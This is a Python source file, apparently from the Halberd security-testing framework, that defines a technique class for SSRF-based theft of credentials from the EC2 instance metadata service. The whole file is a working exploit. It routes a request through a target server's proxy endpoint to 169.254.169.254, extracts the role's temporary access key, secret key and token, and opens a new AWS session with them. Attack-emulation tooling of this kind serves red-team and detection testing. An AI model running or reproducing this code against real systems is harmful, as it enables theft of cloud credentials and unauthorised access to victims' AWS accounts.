from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import requests
from botocore.exceptions import ClientError
from core.aws.aws_session_manager import SessionManager

@TechniqueRegistry.register
class AWSSSRFIMDSCredentialTheft(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1552.007",
                technique_name="Credentials from Password Stores",
                tactics=["Credential Access"],
                sub_technique_name="Container API"
            )
        ]
        super().__init__(
            "SSRF IMDS Credential Theft",
            "Exploits a Server-Side Request Forgery (SSRF) vulnerability on a target web server "
            "to reach the EC2 Instance Metadata Service (IMDSv1) and steal the temporary IAM "
            "credentials attached to the instance. Sends an HTTP request through the SSRF proxy "
            "endpoint to http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>, "
            "parses the returned AccessKeyId, SecretAccessKey, and Token, then registers a new "
            "Halberd AWS session so all subsequent playbook steps run under the stolen identity.",
            mitre_techniques
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            web_server_ip: str = kwargs.get("web_server_ip", None)
            role_name: str = kwargs.get("role_name", None)
            session_name: str = kwargs.get("session_name", "ssrf-stolen-creds")
            port: int = kwargs.get("port", 3000)
            aws_region: str = kwargs.get("aws_region", "us-east-1")
            set_as_active_session: bool = kwargs.get("set_as_active_session", True)

            if web_server_ip in [None, ""] or role_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error": "Invalid Technique Input"},
                    "message": {"Error": "web_server_ip and role_name are required"}
                }

            # Build SSRF URL targeting IMDSv1 credentials endpoint
            imds_creds_path = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
            ssrf_url = f"http://{web_server_ip}:{port}/proxy"

            try:
                response = requests.post(ssrf_url, json={"url": imds_creds_path}, timeout=15)
                response.raise_for_status()
            except requests.exceptions.ConnectionError as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": f"Could not reach SSRF proxy at {web_server_ip}:{port} — check web_server_ip and port"
                }
            except requests.exceptions.Timeout:
                return ExecutionStatus.FAILURE, {
                    "error": "Request timed out",
                    "message": f"SSRF request to {ssrf_url} timed out after 15s"
                }
            except requests.exceptions.HTTPError as e:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": f"SSRF proxy returned HTTP {response.status_code} — check the proxy endpoint path"
                }

            try:
                creds = response.json()
            except Exception:
                return ExecutionStatus.FAILURE, {
                    "error": f"Non-JSON response: {response.text[:200]}",
                    "message": "SSRF response was not valid JSON — IMDS may have returned an error or the role name is wrong"
                }

            access_key = creds.get("AccessKeyId")
            secret_key = creds.get("SecretAccessKey")
            token = creds.get("Token")
            expiration = creds.get("Expiration", "N/A")

            if not all([access_key, secret_key, token]):
                missing = [k for k, v in {"AccessKeyId": access_key, "SecretAccessKey": secret_key, "Token": token}.items() if not v]
                return ExecutionStatus.FAILURE, {
                    "error": f"Missing fields in IMDS response: {missing}",
                    "message": f"IMDS returned a response but it lacked credential fields — got: {list(creds.keys())}"
                }

            # Register a new Halberd session with the stolen credentials
            manager = SessionManager()
            result = manager.create_session(
                session_name=session_name,
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=token,
                region_name=aws_region
            )

            if "error" in result:
                return ExecutionStatus.FAILURE, {
                    "error": result["error"],
                    "message": "Credentials stolen but boto3 session creation failed — token may be expired or invalid"
                }

            if set_as_active_session:
                manager.set_active_session(session_name)

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully stole {role_name} credentials via SSRF and established session '{session_name}'",
                "value": {
                    "role_name": role_name,
                    "access_key_id": access_key,
                    "expiration": expiration,
                    "ssrf_url": ssrf_url,
                    "session_name": session_name,
                    "active_session": set_as_active_session
                }
            }

        except ClientError as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "SSRF IMDS credential theft failed (AWS client error)"
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "SSRF IMDS credential theft failed"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "web_server_ip": {"type": "str", "required": True, "default": None, "name": "Web Server IP", "input_field_type": "text"},
            "role_name": {"type": "str", "required": True, "default": None, "name": "IAM Role Name", "input_field_type": "text"},
            "session_name": {"type": "str", "required": False, "default": "ssrf-stolen-creds", "name": "Halberd Session Name", "input_field_type": "text"},
            "port": {"type": "int", "required": False, "default": 3000, "name": "SSRF Proxy Port", "input_field_type": "number"},
            "aws_region": {"type": "str", "required": False, "default": "us-east-1", "name": "AWS Region", "input_field_type": "text"},
            "set_as_active_session": {"type": "bool", "required": False, "default": True, "name": "Set As Active Session?", "input_field_type": "bool"}
        }
